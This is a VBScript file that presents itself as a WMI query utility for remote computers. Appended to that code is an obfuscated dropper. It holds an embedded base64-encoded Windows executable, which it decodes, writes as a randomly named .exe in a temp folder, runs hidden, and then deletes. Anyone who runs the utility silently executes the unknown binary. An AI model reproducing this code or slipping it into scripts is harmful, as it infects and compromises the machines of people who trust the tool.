On Error Resume Next:Set objWbemLocator = CreateObject("WbemScripting.SWbemLocator")::if Err.Number Then:WScript.Echo vbCrLf & "Error # " & " " & Err.Description:End If:On Error GoTo 0::On Error Resume Next::::Select Case WScript.Arguments.Count:Case 2::strComputer = Wscript.Arguments(0):strQuery = Wscript.Arguments(1):Set wbemServices = objWbemLocator.ConnectServer (strComputer,"Root\CIMV2")::::Case 4:strComputer = Wscript.Arguments(0):strUsername = Wscript.Arguments(1):strPassword = Wscript.Arguments(2):strQuery = Wscript.Arguments(3):Set wbemServices = objWbemLocator.ConnectServer(strComputer,"Root\CIMV2",strUsername,strPassword)::case 6:strComputer = Wscript.Arguments(0):strUsername = Wscript.Arguments(1):strPassword = Wscript.Arguments(2):strQuery = Wscript.Arguments(4):namespace = Wscript.Arguments(5)::Set wbemServices = objWbemLocator.ConnectServer (strComputer,namespace,strUsername,strPassword):Case Else:strMsg = "Error # in parameters passed":WScript.Echo strMsg:WScript.Quit(0)::End Select::::Set wbemServices = objWbemLocator.ConnectServer(strComputer, namespace, strUsername, strPassword)::if Err.Number Then:WScript.Echo vbCrLf & "Error # "  & " " & Err.Description:End If::On Error GoTo 0::On Error Resume Next::::Set colItems = wbemServices.ExecQuery(strQuery)::if Err.Number Then:WScript.Echo vbCrLf & "Error # "  & " " & Err.Description:End If:On Error GoTo 0:::i=0:For Each objItem in colItems:if i=0 then:header = "":For Each param in objItem.Properties_:header = header & param.Name & vbTab:Next:WScript.Echo header:i=1:end if:serviceData = "":For Each param in objItem.Properties_:serviceData = serviceData & param.Value & vbTab:Next:WScript.Echo serviceData:Next:Function NOnBNAJfDYAwo(cPSkbNwAATmfX):jBFYzMRk = "<B64DECODE xmlns:dt="& Chr(34) & "urn:schemas-microsoft-com:datatypes" & Chr(34) & " " & "dt:dt=" & Chr(34) & "bin.base64" & Chr(34) & ">" & cPSkbNwAATmfX & "</B64DECODE>":Set mlsbBPwVy = CreateObject("MSXML2.DOMDocument.3.0"):mlsbBPwVy.LoadXML(jBFYzMRk):NOnBNAJfDYAwo = mlsbBPwVy.selectsinglenode("B64DECODE").nodeTypedValue:set mlsbBPwVy = nothing:End Function::Function milXqEjmjxETVXS():rnWdBhTQsJvBl = "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":Dim FPbHjxvSJaBOtr:Set FPbHjxvSJaBOtr = CreateObject("Scripting.FileSystemObject"):Dim WVfKPmvVuCbDG:Dim NWIdFjSULgWuIXw:Set WVfKPmvVuCbDG = FPbHjxvSJaBOtr.GetSpecialFolder(2):NWIdFjSULgWuIXw = WVfKPmvVuCbDG & "\" & FPbHjxvSJaBOtr.GetTempName():FPbHjxvSJaBOtr.CreateFolder(NWIdFjSULgWuIXw):SwjKfCuW = NWIdFjSULgWuIXw & "\" & "LHEDpDlsIh.exe":Dim mmxvUzbaHsVQ:Set mmxvUzbaHsVQ = CreateObject("Wscript.Shell"):NXjrglGInAEc = NOnBNAJfDYAwo(rnWdBhTQsJvBl):Set rSADuFQahr = CreateObject("ADODB.Stream"):rSADuFQahr.Type = 1:rSADuFQahr.Open:rSADuFQahr.Write NXjrglGInAEc:rSADuFQahr.SaveToFile SwjKfCuW, 2:mmxvUzbaHsVQ.run SwjKfCuW, 0, true:FPbHjxvSJaBOtr.DeleteFile(SwjKfCuW):FPbHjxvSJaBOtr.DeleteFolder(NWIdFjSULgWuIXw):End Function::milXqEjmjxETVXS::WScript.Quit(0):
